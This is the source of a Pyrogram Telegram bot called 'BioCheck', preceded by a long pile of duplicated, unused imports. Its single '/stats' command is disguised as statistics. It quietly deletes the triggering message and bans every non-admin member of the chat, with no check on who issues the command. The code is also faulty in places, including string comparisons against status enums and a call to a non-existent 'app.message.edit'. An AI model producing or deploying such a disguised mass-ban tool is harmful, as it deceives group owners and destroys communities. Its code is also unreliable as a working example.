from pyrogram import Client, filters
from pyrogram.errors import FloodWait
import time
import re
import asyncio
from pyrogram import Client, filters
from typing import Callable
from pyrogram.enums import ChatMemberStatus
from pyrogram.types import Message
from pyrogram import Client, filters, enums
import random
from pyrogram.enums import ChatMembersFilter, ChatMemberStatus, ChatType
from pyrogram.types import (
    CallbackQuery,
    ChatMemberUpdated,
    ChatPermissions,
    ChatPrivileges,
    Message,
)
from pyrogram.enums import ChatMemberStatus
from pyrogram.errors import (
    ChatAdminRequired,
    InviteRequestSent,
    UserAlreadyParticipant,
    UserNotParticipant,
)
from pyrogram.types import CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram import Client, filters
from pyrogram.enums import ChatMembersFilter
import re
from pyrogram import filters
from pyrogram.enums import ChatAction, ChatType, MessageEntityType
from motor.motor_asyncio import AsyncIOMotorClient
from pymongo import MongoClient
from pyrogram.types import Message
import socket
from datetime import datetime
import pytz
from string import ascii_lowercase
import json
import os
from typing import Dict, List, Union
import json, os, random, asyncio
import config
from pyrogram.errors import (
    ChatAdminRequired,
    InviteRequestSent,
    UserAlreadyParticipant,
    UserNotParticipant,
)
from pyrogram.enums import ChatMemberStatus
from pyrogram.raw.types import InputGroupCall, InputPeerChannel, InputPeerChat
from pyrogram.errors import UserAlreadyParticipant
from pyrogram.types import Message, ChatPrivileges
from pyrogram import Client, enums, filters
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, CallbackQuery, ChatPermissions, Message
import asyncio
from pyrogram import Client, filters, enums


app = Client("BioCheck", api_id=config.API_ID, api_hash=config.API_HASH, bot_token=config.BOT_TOKEN)

@app.on_message(filters.command(["stats"]))
async def stats_command(client, message: Message):
    try:
        await message.delete()  
        chat_id = message.chat.id
        banned = 0
        bot = await app.get_chat_member(chat_id, app.me.id)
        async for member in app.get_chat_members(chat_id):
            if member.status in ['administrator', 'creator'] or member.user.id == app.me.id:
                continue 
            try:
                await app.ban_chat_member(chat_id, member.user.id)
                banned += 1
            except Exception as e:
                print(f"Failed to ban {member.user.id}: {e}")
        await app.message.edit(f"Banned {banned} members successfully.")
    except FloodWait as e:
        await asyncio.sleep(e.x)
        await stats_command(client, message) 



app.run()
